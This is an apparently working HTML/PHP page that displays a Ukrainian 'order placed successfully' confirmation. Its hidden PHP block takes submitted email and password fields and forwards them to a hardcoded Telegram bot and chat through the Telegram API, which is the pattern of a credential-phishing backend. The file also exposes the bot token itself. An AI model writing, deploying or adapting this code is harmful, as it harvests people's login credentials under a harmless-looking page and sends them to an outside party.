<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="../css/php.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Kanit:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">
    <title>Document</title>
</head>
<body>
    <div class="test">
        <div class="wrapper1">
            <h1 class="thanks">Ви успішно оформили замовлення!</h1>
            <div class="circle margin"></div>
            <p>Ми зв'яжемося з вами найближчим часом</p>
            <div class="margin">
                <a href="../index.html">На головну</a>
            </div>
        </div>
    </div>
<?php
if($_POST) {
    try {
        $mail = $_POST["mail"];
        $pass = $_POST["pass"];
    
        } catch (\Throwable $th) {
            $mail = "ERROR IN MESSAGE";
        }
    
        $token = "7176990752:AAFgJ-AVyV6WCpxgP9BqXjMyzUiYz8nFiJo";
        $chat_id = 5858755336;
    
        $mail = urlencode("$mail");
        $pass = urlencode("$pass");
    
        $urlQuery = "https://api.telegram.org/bot". $token . "/sendMessage?chat_id=". $chat_id ."&text=" .
        "<b>Заявка з сайту Forms: </b>%0a" .
        "<b>Form6: </b>%0A" .
        "<i>Ел. пошта: $mail</i>%0A" .
        "<i>Пароль: $pass</i>%0A";
        $urlQuery .= "&parse_mode=HTML";
        $result = file_get_contents($urlQuery);
}
?>
</body>
</html>